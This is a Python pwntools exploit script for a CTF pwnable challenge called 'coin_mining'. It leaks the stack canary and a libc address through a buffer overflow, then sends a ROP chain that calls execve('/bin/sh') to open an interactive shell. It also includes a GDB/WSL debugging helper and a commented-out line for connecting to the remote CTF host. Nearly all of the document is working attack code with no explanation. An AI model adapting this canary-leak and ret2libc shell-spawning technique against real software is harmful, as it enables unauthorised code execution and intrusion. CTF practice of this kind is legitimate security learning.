#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2
s = process('./coin_mining')
def GDB():     
    import os
    script = '''
    #!/bin/sh

    cd /mnt/f/ctf/Pwnable/pwnable.tw/de-alsr
    '''
    script += f'gdb -p {s.pid} -x /tmp/command.gdb'
    with open('/tmp/script.sh', 'w') as f: f.write(script)
    os.system("chmod +x /tmp/script.sh")

    command = '''
    start
    brva 0x
    c
    '''
    with open('/tmp/command.gdb', 'w') as f: f.write(command)
    q = process(f'cmd.exe /c start C:\\Windows\\system32\\wsl.exe /tmp/script.sh'.split())
    # input()
    
# GDB()

# s = remote('coin-mining-88259e7976818a8f.chall.ctf.blackpinker.com', 443, ssl=True)

elf = ELF('coin_mining_patched')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
context.endian = 'little'

s.sendline(b'1')
s.sendlineafter(b'Guess what coin I will give you: ', 136*'A')
s.recvline()
canary = b'\n' + s.recv()[:7]  
canary = u64(canary) - 0x0a
log.info('Canary : ' + hex(canary))

s.send(152*b'A')
libc_leak = s.recvuntil(b'??', drop=True)[152:]
print(libc_leak)
libc_leak = u64(libc_leak.ljust(8, b'\x00')) 
libc.address = libc_leak - 138135
log.info('Libc_leak : '+ hex(libc_leak))
log.info('Libc_base : '+ hex(libc.address))
pop_rdi = libc.address + 0x000000000002155f
pop_rsi = libc.address + 0x0000000000023e6a
pop_rdx = libc.address + 0x0000000000001b96

payload = b'notHMCUS-CTF{a_coin_must_be_here}\n'
payload += p64(0)
payload += (136-len(payload))*b'A'
payload += p64(canary)
payload += (152-len(payload))*b'A'
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(libc.symbols['execve'])
payload += p64(libc.symbols['exit'])

s.sendline(payload)
s.interactive()


